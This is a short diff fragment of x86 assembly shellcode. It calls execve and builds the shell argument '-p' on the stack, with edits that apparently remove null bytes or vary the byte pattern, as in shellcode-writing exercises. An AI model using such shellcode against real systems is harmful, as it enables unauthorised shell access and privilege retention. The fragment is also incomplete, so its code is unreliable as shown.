@@ -7,11 +7,10 @@ global _start
 section .text 
 _start:
 	xor eax, eax
-	mov eax, 0xb
+	mov al, 0xb
+	xor edx, edx 
 	push edx
-	mov esi, 0x849f
-	sub esi, 0x1472
-	push esi
+	push word 0x702d	;"-p"
 	mov ecx,esp		
 	push edx
 	push byte 0x68		;"h"
